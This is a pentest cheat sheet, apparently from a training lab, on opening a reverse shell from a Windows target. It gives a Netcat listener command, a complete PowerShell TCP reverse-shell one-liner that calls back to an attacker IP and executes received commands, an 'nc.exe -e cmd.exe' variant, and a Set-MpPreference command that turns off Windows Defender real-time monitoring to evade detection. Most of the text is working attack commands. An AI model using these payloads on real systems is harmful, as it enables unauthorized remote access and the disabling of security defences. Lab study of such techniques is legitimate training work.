**METHODOLOGY**

1. Start a listener on `<ATTACK_IP>` using port 443 to mimic HTTPS traffic and bypass basic outbound filtering.
2. Identify native tools on the Windows target to avoid unnecessary file transfers of non-native binaries like Netcat.
3. Execute the PowerShell TCP client one-liner.
4. If execution fails with a **ScriptContainedMaliciousContent** error, verify privileges and attempt to disable real-time monitoring.
5. Confirm connection on the listener and verify identity with `whoami`.

---

## Reverse Shell Listener

Use when inbound connections to the target are blocked by a firewall or to increase the chance of remaining undetected by leveraging common outbound ports.

Start a Netcat listener on a port likely to be allowed outbound through network-level firewalls

```
sudo nc -lvnp <PORT>
```

- Tool comparison
    
    - Netcat -> `nc -lvnp <PORT>` -> standard listener for quick shell capture.
- Gotchas **Deep packet inspection** at Layer 7 can identify and block reverse shell traffic even on common ports like 443.
    

## PowerShell Native Payload

Use when you need to establish a shell on a Windows target without transferring external binaries like Netcat.

Execute a PowerShell-based TCP client to connect back to the listener

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACK_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Tool comparison
    
    - PowerShell -> One-liner above -> prefer for living off the land on modern Windows targets.
    - Netcat (Windows) -> `nc.exe <ATTACK_IP> <PORT> -e cmd.exe` -> prefer only if the binary is already present or file upload is trivial.
- Edge cases
    
    - Browser-based clipboard features in Pwnbox may mangle the payload during pasting.
- Gotchas **Clipboard mangling** can break the one-liner; paste into Notepad on the target first, then copy-paste into the CLI.
    

## Windows Defender Evasion

Use when the target OS blocks payload execution with a **ParserError** or specifically identifies the script as malicious content.

Disable real-time monitoring to allow the execution of known malicious payloads

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

- Dangerous / misconfigured settings
    
    - Administrative PowerShell console access is required to modify Defender preferences.
- Gotchas **Insufficient privileges** will cause the disable command to fail; must be run from an elevated prompt.